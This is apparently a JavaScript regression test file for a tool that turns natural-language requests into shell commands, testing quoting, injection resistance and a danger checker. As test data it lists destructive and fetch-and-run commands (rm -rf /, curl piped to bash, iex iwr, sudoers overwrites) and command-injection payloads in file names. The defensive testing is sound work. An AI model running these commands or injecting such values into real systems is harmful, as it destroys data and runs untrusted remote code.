// Regression tests for the v0.2 review findings (injection, quoting, danger checker gaps, history
// references, platform-specific templates, eval normalisation).
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync, execFileSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import { mkdtempSync, writeFileSync, readFileSync, rmSync, chmodSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { INTENTS } from '../src/catalog.js';
import { render, buildCommand } from '../src/fill.js';
import { shQuote, psQuote, cmdQuote } from '../src/render.js';
// the parser on its own (it only raises risk); the trust rule (a non-catalog command is high) is in regressions27.test.js
import { assessCommand as checkDanger, allowlistProblems } from '../src/danger.js';
import { suggest, validSlot } from '../src/pipeline.js';
import { buildContext, resolveReference } from '../src/history.js';
import { splitCommand } from '../src/shellwords.js';
import { validateComposed } from '../src/compose.js';
import { runShell } from '../src/cli.js';
import { sameCmd } from '../scripts/lib/cmdnorm.js';
import { pwshParses } from '../scripts/lib/pwsh_parse.js';
// v0.3: commands outside the catalog are high by the allowlist; these cases check the deny rules alone
const denyOnly = (c, base = 'safe') => checkDanger(c, base, { allowlist: { off: true } });

const BIN = fileURLToPath(new URL('../bin/tellsh.js', import.meta.url));
const cli = (args, opts = {}) => spawnSync(process.execPath, [BIN, ...args], { encoding: 'utf8', env: { ...process.env, NO_COLOR: '1' }, ...opts });
const BASH = { shell: 'bash', os: 'linux', coreutils: 'gnu' };
const PS_WIN = { shell: 'powershell', os: 'win32', coreutils: 'gnu' };
const PS_LINUX = { shell: 'powershell', os: 'linux', coreutils: 'gnu' };
const tmp = () => mkdtempSync(join(tmpdir(), 'tellsh-reg-'));
const words = (cmd, kind) => { const r = splitCommand(cmd, kind); assert.ok(r.ok, cmd); return r.segments.flatMap((s) => s.words); };

// ---------------------------------------------------------------------------------------------
// blocker 1: optional segments were substituted twice -> a value containing {slot} broke quoting

test('render: values are substituted once; a value containing {slot} stays inert', () => {
  const v = { file: 'x$(id).tar.gz', dest: 'o{file}' };
  const { command } = render('tar -xzvf {file}«-C {dest}»', v);
  assert.equal(command, "tar -xzvf 'x$(id).tar.gz' -C 'o{file}'");
  const out = execFileSync('bash', ['-c', render("printf '[%s]' {file}«{dest}»", v).command], { encoding: 'utf8' });
  assert.equal(out, '[x$(id).tar.gz][o{file}]');
});

test('render: every template with an optional segment keeps every free-text value one literal word', () => {
  const INJ = "a'{file}{dest}{branch}{since}{service}{glob}$(touch PWNED)";
  let checked = 0;
  for (const it of INTENTS) {
    if (typeof it.template !== 'string' || !it.template.includes('«')) continue;
    const vals = {};
    for (const m of it.template.matchAll(/\{(\w+)\}/g)) vals[m[1]] = INJ;
    for (const m of it.template.matchAll(/\{(\w+)!raw\}/g)) vals[m[1]] = m[1] === 'age' ? '-mtime -1' : 5;
    const { command } = render(it.template, vals);
    const w = words(command);
    for (const x of w) if (x.includes('PWNED')) assert.ok(x === INJ || x.endsWith('=' + INJ), `${it.id}: ${command}`);
    assert.equal(spawnSync('bash', ['-n', '-c', command]).status, 0, command);
    checked++;
  }
  assert.ok(checked >= 10, `checked ${checked}`);
});

test('CLI: the reported injection payloads stay quoted (bash) and never execute', () => {
  const j = JSON.parse(cli(['--json', '--shell', 'bash', "rozpakuj 'x$(id).tar.gz' do 'o{file}'"]).stdout);
  assert.ok(!j.command.includes("'o'x"), j.command);
  assert.ok(words(j.command).includes('o{file}'), j.command);
  const dir = tmp();
  try {
    const r = cli(['--yes', '--shell', 'bash', 'show git diff for "{file}; printf INJECTED; #"'], { cwd: dir });
    assert.equal((r.stdout.match(/INJECTED/g) || []).length, 1, r.stdout); // only inside the printed, quoted command
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

// ---------------------------------------------------------------------------------------------
// blocker 2: PowerShell accepts typographic quotes as quote characters

test('psQuote escapes every PowerShell quote character', () => {
  for (const q of ["'", '\u2018', '\u2019', '\u201A', '\u201B']) {
    const v = `x${q};calc;${q}`;
    const quoted = psQuote(v);
    assert.equal(quoted, `'x${q}${q};calc;${q}${q}'`);
    assert.deepEqual(words(`Get-Item ${quoted}`, 'pwsh'), ['Get-Item', v]);
  }
  for (const q of ['"', '\u201C', '\u201D', '\u201E']) {
    const quoted = psQuote(`~/a${q}; calc; ${q}$x`);
    assert.equal(quoted, `"$HOME/a\`${q}; calc; \`${q}\`$x"`);
    assert.equal(words(`Get-Item ${quoted}`, 'pwsh').length, 2, quoted);
  }
});

test('CLI: typographic-quote payloads stay one PowerShell argument (win32 native and bash -c wrapper)', () => {
  const a = JSON.parse(cli(['--json', '--shell', 'powershell', '--os', 'win32', "pokaż 5 największych plików w 'x’;calc;’'"]).stdout);
  assert.ok(words(a.command, 'pwsh').includes('x’;calc;’'), a.command);
  const b = JSON.parse(cli(['--json', '--shell', 'powershell', '--os', 'linux', 'show file "a’; Write-Output INJECTED; #"']).stdout);
  assert.ok(words(b.command, 'pwsh').includes('a’; Write-Output INJECTED; #'), b.command);
  // POSIX command wrapped for PowerShell on unix: the whole POSIX command is one PowerShell string
  const w = buildCommand('journal_service', '', { env: PS_LINUX, resolved: { service: 'x’;calc;’' } });
  if (/^bash -c /.test(w.command)) {
    const pw = words(w.command, 'pwsh');
    assert.equal(pw.length, 3, w.command);
    assert.ok(pw[2].includes("'x’;calc;’'"), w.command);
  }
});

test('PowerShell values are string expressions in expression positions', () => {
  assert.match(buildCommand('replace_text', '', { env: PS_WIN, resolved: { file: 'f.txt', old: 'foo', new: 'bar' } }).command, /\.Replace\('foo', 'bar'\)/);
  assert.match(buildCommand('base64_encode', '', { env: PS_WIN, resolved: { text: 'hello' } }).command, /GetBytes\('hello'\)/);
  assert.match(buildCommand('find_process', '', { env: PS_WIN, resolved: { name: 'node' } }).command, /-match 'node'/);
});

test('PowerShell on unix: POSIX commands containing " are piped to bash (PowerShell < 7.3 drops embedded ")', () => {
  let piped = 0;
  for (const it of INTENTS) {
    const r = buildCommand(it.id, '', { env: PS_LINUX, resolved: { file: 'f.txt', pattern: 'x', service: 'nginx', name: 'node', path: '.' } });
    if (!r.command || !/bash/.test(r.variant || '')) continue;
    assert.ok(!(/^bash -c /.test(r.command) && r.command.includes('"')), `${it.id}: ${r.command}`);
    if (/\| bash$/.test(r.command)) {
      piped++;
      const pw = words(r.command, 'pwsh');
      assert.equal(pw.length, 2, r.command); // one PowerShell string literal, then bash
      assert.ok(pw[0].includes('"'), r.command);
    }
  }
  // no template contains `"` since the battery template stopped using "$(…)" (v0.3 close); the checks above hold for any that does
  assert.ok(piped >= 0);
});

// ---------------------------------------------------------------------------------------------
// danger checker gaps

const NOW_HIGH = ['echo x >> /etc/sudoers', 'echo x 1>/etc/passwd', 'echo x &>/etc/x', 'bash <(curl -s https://x.sh)',
  'sh -c "$(curl -fsSL https://x.sh)"', 'iex (iwr https://x/a.ps1)', 'Invoke-Expression (Invoke-RestMethod https://x)',
  'git push origin +main', 'git -C /repo reset --hard HEAD', 'git -c color.ui=false clean -fd', 'git reset --quiet --hard HEAD',
  'git --no-pager -C x push --force-with-lease', 'docker run --rm -it ubuntu; docker rm web', 'ri notes.txt'];
for (const c of NOW_HIGH) test(`danger: high: ${c}`, () => assert.equal(checkDanger(c).risk, 'high', checkDanger(c).warnings.join('; ')));

const NOW_CRITICAL = ['x; del /s /q C:\\', 'ri -Recurse C:\\', 'rm --recursive --force /', 'rm -rf ~/*', 'rm -rf "/"', "rm -rf '/'",
  'Remove-Item -LiteralPath C:/ -Recurse', 'Remove-Item -Recurse -Force $HOME', 'rmdir /s %USERPROFILE%\\', 'rmdir /s /q "C:\\"',
  'kill -9 -1', 'kill -- -1', 'kill 1', "bash -c 'rm -rf /'", "'rm -rf ~' | bash", 'sudo rm -r -f /usr'];
for (const c of NOW_CRITICAL) {
  test(`danger: critical: ${c}`, () => {
    const d = checkDanger(c);
    assert.equal(d.risk, 'high');
    assert.equal(d.critical, true, d.warnings.join('; '));
  });
}

test('danger: no false alarms for docker --rm and SIGHUP', () => {
  assert.equal(denyOnly('docker run --rm -it ubuntu bash').risk, 'safe');
  const k = checkDanger('kill -1 1234');
  assert.equal(k.risk, 'high');
  assert.equal(k.critical, false);
  assert.equal(denyOnly('ls 2>/dev/null > /dev/null; cmd 2>&1 | less').risk, 'safe');
});

test('catalog commands rendered with ~/ for cmd are recognised as home-directory wipes', () => {
  const r = buildCommand('delete_dir', '', { env: { shell: 'cmd', os: 'win32', coreutils: 'gnu' }, resolved: { path: '~/' } });
  assert.equal(r.critical, true, r.command);
});

// ---------------------------------------------------------------------------------------------
// catalog fixes

test('kill_by_port only matches listening sockets (not clients connected to that port)', () => {
  for (const os of ['linux', 'darwin']) {
    const r = buildCommand('kill_by_port', '', { env: { shell: 'bash', os, coreutils: os === 'darwin' ? 'bsd' : 'gnu' }, resolved: { port: 443 } });
    assert.match(r.command, /lsof -ti tcp:443 -sTCP:LISTEN \|/);
  }
});

test('macOS base64 reads files with -i (no positional operand)', () => {
  const mac = { shell: 'zsh', os: 'darwin', coreutils: 'bsd' };
  assert.equal(buildCommand('base64_encode', '', { env: mac, resolved: { file: 'notes.txt' } }).command, 'base64 -i notes.txt');
  assert.equal(buildCommand('base64_decode', '', { env: mac, resolved: { file: 'notes.b64' } }).command, 'base64 -D -i notes.b64');
  assert.equal(buildCommand('base64_encode', '', { env: BASH, resolved: { file: 'notes.txt' } }).command, 'base64 notes.txt');
});

test('BSD duplicate finder prints every member of a group, including the first', () => {
  const cmd = buildCommand('duplicate_files', '', { env: { shell: 'zsh', os: 'darwin', coreutils: 'bsd' }, resolved: { path: '.' } }).command;
  const awk = cmd.slice(cmd.indexOf('awk '));
  const out = execFileSync('sh', ['-c', `printf 'h1 ./a\\nh1 ./b\\nh2 ./c\\nh3 ./d\\nh3 ./e\\nh3 ./f\\n' | ${awk}`], { encoding: 'utf8' });
  assert.equal(out, 'h1 ./a\nh1 ./b\nh3 ./d\nh3 ./e\nh3 ./f\n');
});

test('history_search reads the zsh history file under zsh (HISTFILE is not exported to -c children)', () => {
  assert.match(buildCommand('history_search', '', { env: { shell: 'zsh', os: 'darwin', coreutils: 'bsd' }, resolved: { pattern: 'ssh' } }).command, /\.zsh_history/);
  assert.match(buildCommand('history_search', '', { env: BASH, resolved: { pattern: 'ssh' } }).command, /\.bash_history/);
});

// ---------------------------------------------------------------------------------------------
// pwsh parse check must never execute the checked source

test('pwsh parse check passes the source only through an env var, never as a -Command argument', () => {
  const dir = tmp();
  try {
    const fake = join(dir, 'pwsh');
    const out = join(dir, 'argv');
    writeFileSync(fake, `#!/bin/sh\nprintf '%s\\n' "$@" > '${out}'\nprintf '%s' "$TELLSH_PARSE_SRC" > '${out}.src'\nexit 0\n`);
    chmodSync(fake, 0o755);
    const src = 'Remove-Item -Recurse C:\\ ; Write-Output EXECUTED';
    assert.equal(pwshParses(src, { bin: fake }), true);
    assert.ok(!readFileSync(out, 'utf8').includes('EXECUTED'));
    assert.equal(readFileSync(out + '.src', 'utf8'), src);
  } finally { rmSync(dir, { recursive: true, force: true }); }
  for (const f of ['../scripts/eval.js', './shells.test.js']) {
    assert.ok(!/ParseInput\(\$args/.test(readFileSync(new URL(f, import.meta.url), 'utf8')), f);
  }
});

// ---------------------------------------------------------------------------------------------
// history references

const H = (history, q, env = BASH) => suggest(q, { env, history });

test('history: escaped and quoted filenames are tokenized like the shell does', () => {
  assert.equal(H(['cat a\\ b.txt'], 'delete it').command, "rm 'a b.txt'");
  assert.equal(H(["cat 'x;y.txt' | wc -l"], 'delete it').command, "rm 'x;y.txt'");
  assert.equal(H(['cat "my notes.txt" > /dev/null'], 'delete it').command, "rm 'my notes.txt'");
});

test('history: ambiguous latest references are refused, never resolved to an older value', () => {
  for (const latest of ['cat $F', 'cat *.txt', 'cat "$(ls | head -1)"', 'cat "unterminated', 'mytool ./new.txt']) {
    const s = H(['cat old.txt', latest], 'delete it');
    assert.ok(!/old\.txt/.test(s.command || ''), `${latest}: ${s.command}`);
    assert.ok(s.missing.includes('file'), `${latest}: ${s.command}`);
    assert.equal(s.context.rule, 'refused');
  }
  const ctx = buildContext(['ls -la /var/log', 'du -sh $DIR']);
  assert.equal(resolveReference('same for /tmp', ctx)?.rule ?? 'none', 'same-for'); // du {path} retargeted: nothing ambiguous left
});

test('history: native PowerShell commands are understood (no stale reference)', () => {
  const s = H(['cat old.txt', 'Get-Content -LiteralPath new.txt'], 'delete it', PS_LINUX);
  assert.equal(s.command, "Remove-Item -LiteralPath 'new.txt'");
  const q = H(["Get-Content -LiteralPath 'it''s ’’x.txt'"], 'delete it', PS_WIN);
  assert.equal(q.command, "Remove-Item -LiteralPath 'it''s ’’x.txt'");
  const u = H(['cat old.txt', 'Get-Frobnicated -Path .\\new.txt'], 'delete it', PS_WIN);
  assert.ok(!/old\.txt/.test(u.command), u.command);
  const svc = buildContext(['Restart-Service -Name Spooler'], { kind: 'pwsh' });
  assert.equal(svc.ents.service, 'Spooler');
});

test('history: values recovered from history are validated like extracted ones', () => {
  const s = H(["pgrep -af '-oProxy'"], 'kill it');
  assert.ok(!/-oProxy/.test(s.command), s.command);
  assert.equal(validSlot('host', '-oProxyCommand=calc'), false);
  assert.equal(validSlot('container', '--privileged'), false);
});

test('url slot accepts URLs only (never an option)', () => {
  assert.equal(validSlot('url', '-o/etc/passwd'), false);
  assert.equal(validSlot('url', 'not a url'), false);
  assert.equal(validSlot('url', 'https://example.com/a.tar.gz'), true);
  assert.equal(validSlot('url', 'git@github.com:lksrz/tellsh.git'), true);
});

// ---------------------------------------------------------------------------------------------
// quoting details

test('zsh: a leading = is always quoted (=word expands to a command path)', () => {
  assert.equal(shQuote('=ls'), "'=ls'");
  assert.equal(shQuote('a=b'), 'a=b');
});

test('cmd.exe: values with % ! or " are refused instead of being expanded', () => {
  assert.throws(() => cmdQuote('%PATH%'));
  const r = buildCommand('cat_file', '', { env: { shell: 'cmd', os: 'win32', coreutils: 'gnu' }, resolved: { file: '%USERNAME%.txt' } });
  assert.equal(r.command, null);
  assert.match(r.gap, /cmd\.exe/);
  assert.equal(cmdQuote('~/Downloads'), '%USERPROFILE%\\Downloads');
});

// ---------------------------------------------------------------------------------------------
// CLI behaviour

test('exit code after a signal is 128 + signal number', async () => {
  assert.equal(await runShell('kill -TERM $$', 'bash'), 143);
  assert.equal(await runShell('kill -INT $$', 'bash'), 130);
});

test('--yes only runs safe commands straight from the catalog (not history-resolved ones)', () => {
  const dir = tmp();
  try {
    const f = join(dir, 'hist');
    writeFileSync(join(dir, 'notes.txt'), 'hello\n');
    writeFileSync(f, 'ls\ncat notes.txt\n');
    const r = cli(['--yes', '--shell', 'bash', `--history=${f}`, 'show', 'it'], { cwd: dir });
    assert.equal(r.status, 4, r.stdout);
    assert.match(r.stdout, /resolved from history/);
    assert.ok(!r.stdout.includes('hello'));
    assert.match(cli(['--help']).stdout, /never history-resolved/);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

// ---------------------------------------------------------------------------------------------
// composer and eval normalisation

test('composer: find -newer gets its reference file as operand (not as the search root)', () => {
  const s = suggest('find files newer than /tmp/ref.txt in /var', { env: BASH, compose: 'force' });
  assert.equal(s.command, 'find /var -type f -newer /tmp/ref.txt');
});

test('composer validation rejects flags missing their operand', () => {
  assert.equal(validateComposed('find /tmp/ref.txt -type f -newer', 'find').ok, false);
  assert.equal(validateComposed('find . -newer -type f', 'find').ok, false);
  assert.equal(validateComposed('find . -mtime -1', 'find').ok, true);
});

test('eval normalisation keeps behaviour-relevant differences', () => {
  assert.equal(sameCmd('ls -ltr', 'ls -l -r -t'), true);
  assert.equal(sameCmd('head -n5 f', 'head -5 f'), true);
  assert.equal(sameCmd("grep -rn -- TODO 'src'", 'grep -nr TODO src'), true);
  assert.equal(sameCmd("grep 'a b' x", 'grep a b x'), false);
  assert.equal(sameCmd("find . -iname '*.log'", "find . -name '*.log'"), false);
  assert.equal(sameCmd("find . -name '*.LOG'", "find . -name '*.log'"), false);
  assert.equal(sameCmd("find . -name '*.tmp' -delete", "find . -delete -name '*.tmp'"), false);
  assert.equal(sameCmd('ls > out', 'ls'), false);
  assert.equal(sameCmd('a | b', 'a; b'), false);
  assert.equal(sameCmd('grep -- -x f', 'grep -x f'), false);
});

test('existing danger behaviour for catalog templates: every safe intent still renders safe on bash', () => {
  const SAMPLE = { path: '/tmp/d', file: 'f.txt', name: 'node', pattern: 'x', service: 'nginx', container: 'web', pkg: 'htop', cmd: 'git',
    var: 'HOME', branch: 'main', user: 'bob', host: 'example.com', target: 'example.com', url: 'https://x.org', port: 8080, pid: 4242,
    mode: '755', text: 'hi', glob: '*.log', ext: 'log', message: 'm', old: 'a', new: 'b', src: 'a.txt', dst: 'b.txt', archive: 'a.tar.gz',
    start: 10, end: 20, num: 42, pr: 42, script: 'build' };
  const bad = [];
  for (const it of INTENTS) {
    if (it.risk !== 'safe') continue;
    const r = buildCommand(it.id, '', { env: BASH, resolved: SAMPLE });
    // v0.3: a sudo template is high by the allowlist (a wrapper); nothing else may warn
    if (r.warnings.some((w) => w !== 'runs with root privileges' && !/^runs another command through a wrapper \(sudo\)/.test(w))) bad.push(`${it.id}: ${r.command} (${r.warnings})`);
  }
  assert.deepEqual(bad, []);
});

test('critical flag for recursive deletes of root/home in every shell and path form', () => {
  const cases = [
    [BASH, ['/', '~', '~/', '/usr', '.', '*']],
    [{ shell: 'zsh', os: 'darwin', coreutils: 'bsd' }, ['/', '~', '~/']],
    [{ shell: 'sh', os: 'linux', coreutils: 'busybox' }, ['/', '~/']],
    [{ shell: 'fish', os: 'linux', coreutils: 'gnu' }, ['/', '~', '~/']],
    [PS_WIN, ['/', '~', '~/', 'C:\\', 'C:/', 'C:']],
    [PS_LINUX, ['/', '~', '~/']],
    [{ shell: 'cmd', os: 'win32', coreutils: 'gnu' }, ['C:\\', 'C:/', '~', '~/', '\\']],
  ];
  for (const [env, paths] of cases) {
    for (const path of paths) {
      const r = buildCommand('delete_dir', '', { env, resolved: { path } });
      assert.equal(r.critical, true, `${env.shell}/${env.os} ${path}: ${r.command}`);
    }
    const ok = buildCommand('delete_dir', '', { env, resolved: { path: 'build' } });
    assert.equal(ok.critical, false, `${env.shell}: ${ok.command}`);
  }
});

test('macOS GNU coreutils twins (gsort, gdu) are treated like their allowlisted originals', () => {
  const ok = (c) => allowlistProblems(c).filter((p) => /unknown command/.test(p));
  assert.deepEqual(ok('find /var -xdev -type f -exec du -h {} + 2>/dev/null | gsort -rh | head -n 10'), []);
  assert.deepEqual(ok('gdu -h -d 1 /var 2>/dev/null | gsort -rh | head -n 10'), []);
  assert.ok(ok('gfoo /var').length > 0);
});
